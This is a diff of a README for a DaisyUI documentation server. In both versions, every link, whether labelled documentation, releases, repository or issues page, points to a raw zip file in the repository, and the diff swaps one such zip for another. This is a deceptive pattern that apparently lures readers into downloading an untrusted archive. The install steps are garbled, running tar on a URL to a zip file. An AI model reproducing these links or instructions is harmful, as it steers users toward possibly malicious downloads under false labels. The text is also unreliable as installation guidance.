@@ -1,6 +1,6 @@
 # 🌼 daisyui-mcp - A Simple Server for DaisyUI Docs
 
-![Download](https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip)
+![Download](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **daisyui-mcp**! This handy tool sets up a local server to showcase D
 
 ## 📥 Download & Install
 
-To download the latest version of **daisyui-mcp**, please visit this page: [GitHub Releases](https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip).
+To download the latest version of **daisyui-mcp**, please visit this page: [GitHub Releases](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest release version.
@@ -59,11 +59,11 @@ Before you install, make sure you have:
 
 ### For Linux Users:
 
-1. Go to your downloaded file, typically ending in `https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip`.
+1. Go to your downloaded file, typically ending in `https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip`.
 2. Open Terminal and navigate to the download directory.
 3. Use the command to extract:
    ```
-   tar -xvzf https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip
+   tar -xvzf https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip
    ```
 4. Navigate to the extracted folder:
    ```
@@ -91,18 +91,18 @@ Once the server is running, you can view the DaisyUI components. Here are some t
 
 ## 🔗 Additional Resources
 
-- [DaisyUI Documentation](https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip)
+- [DaisyUI Documentation](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip)
+- [GitHub Repository](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip)
 
 ## 📞 Support
 
-If you encounter any issues while using **daisyui-mcp**, feel free to reach out to the community through the [GitHub Issues page](https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip). We welcome any feedback or questions.
+If you encounter any issues while using **daisyui-mcp**, feel free to reach out to the community through the [GitHub Issues page](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip). We welcome any feedback or questions.
 
 ## 🔄 Updates
 
 To keep your **daisyui-mcp** up to date:
 
-1. Regularly check the [Good Releases page](https://raw.githubusercontent.com/SidiqHadi/daisyui-mcp/main/components/daisyui-mcp-v1.4.zip).
+1. Regularly check the [Good Releases page](https://github.com/SidiqHadi/daisyui-mcp/raw/refs/heads/main/components/mcp-daisyui-3.0.zip).
 2. Download the latest version when available.
 3. Repeat the installation steps to update.
 
